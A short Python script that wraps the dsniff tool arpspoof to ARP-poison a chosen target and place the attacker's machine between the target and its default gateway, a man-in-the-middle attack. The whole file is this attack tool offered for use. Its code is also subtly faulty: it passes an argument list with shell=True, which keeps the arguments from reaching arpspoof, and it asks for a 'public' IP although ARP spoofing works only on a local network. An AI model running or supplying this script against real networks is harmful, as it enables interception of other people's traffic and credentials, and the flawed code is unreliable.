# NOTE: you do need to install dsniff

import subprocess
import re

# Get user input for target public IP address
target_ip = input("Enter the target public IP address: ")

# Get the host IP address
proc = subprocess.Popen(["hostname", "-I"], stdout=subprocess.PIPE)
host_ip = proc.stdout.read().decode("utf-8").split()[0]

# Calculate the default gateway IP address
proc = subprocess.Popen(["ip", "route"], stdout=subprocess.PIPE)
output = proc.stdout.read().decode("utf-8")
default_gateway_ip = re.search(r"default via ([\d.]+)", output).group(1)

# Check if the target IP is the default gateway or the host IP
if target_ip == default_gateway_ip:
    print("ERROR: Target IP is the default gateway.")
elif target_ip == host_ip:
    print("ERROR: Target IP is the host IP.")
else:
    # Build the arpspoof command with the obtained IP addresses
    arpspoof_cmd = ["arpspoof", "-i", "eth0", "-t", target_ip, default_gateway_ip]

    # Run the arpspoof command using subprocess
    subprocess.call(arpspoof_cmd, shell=True)
